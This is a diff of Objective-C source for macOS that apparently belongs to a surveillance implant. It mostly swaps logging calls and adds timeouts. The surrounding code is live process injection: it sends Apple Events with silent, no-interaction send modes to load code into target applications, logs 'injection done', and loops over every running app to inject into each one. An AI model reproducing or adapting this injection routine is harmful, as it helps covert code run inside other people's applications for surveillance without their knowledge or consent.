@@ -177,31 +177,38 @@ void lionSendEventToPid(pid_t pidP)
 {
   AEEventID eventID = 'load';
   int rUid = getuid();
-
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
+  
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
 
 #ifdef DEBUG_CORE
-  verboseLog(@"send event to application pid %d", pidP);
+  infoLog(@"send event to application pid %d", pidP);
 #endif
 
 #ifdef DEBUG_CORE
-  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+  infoLog(@"enter critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
 
   // trimming process u&g
-  seteuid(rUid);
-
+  seteuid(rUid); 
+  
+  [app setTimeout:1];
+  
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
+      
+#ifdef DEBUG_CORE
+  infoLog(@"send kASAppleScriptSuite [%d]", pidP);
+#endif
 
   sleep(1);
-
+  
+  [app setTimeout:1];
+  
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
 
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
@@ -211,20 +218,20 @@ void lionSendEventToPid(pid_t pidP)
                        parameters: 'pido', pid, 0];
 
 #ifdef DEBUG_CORE
-  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+  infoLog(@"exit critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
 
   if (injectReply != nil) 
     {
-#ifdef DEBUG_CORE	
-      warnLog(@"unexpected injectReply: %@", injectReply);
+#ifdef DEBUG_CORE
+      infoLog(@"unexpected injectReply: %@ [%d]", injectReply, pidP);
 #endif
     }
   else 
     {
 #ifdef DEBUG_CORE
-      verboseLog(@"injection done");
+      infoLog(@"injection done [%d]", pidP);
 #endif
     }
 
@@ -3516,8 +3523,7 @@ void lionSendEventToPid(pid_t pidP)
       NSMutableArray *args = [NSMutableArray array];
       NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
 
-      /* set arguments */
-      [args addObject:[[[NSBundle mainBundle] executablePath] lastPathComponent]];
+      //argv
       [args addObject: @"-p"];
       [args addObject: pidStr];
       [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
@@ -3637,10 +3643,10 @@ void lionSendEventToPid(pid_t pidP)
         {
           NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
           NSNumber *thePid = [[NSNumber alloc] initWithInt: [app processIdentifier]];
-//#ifdef DEBUG_CORE
-        NSLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
+#ifdef DEBUG_CORE
+        infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
               [app localizedName], [app processIdentifier]);
-//#endif
+#endif
           [self sendEventToPid:thePid]; 
           [thePid release];
           usleep(500);
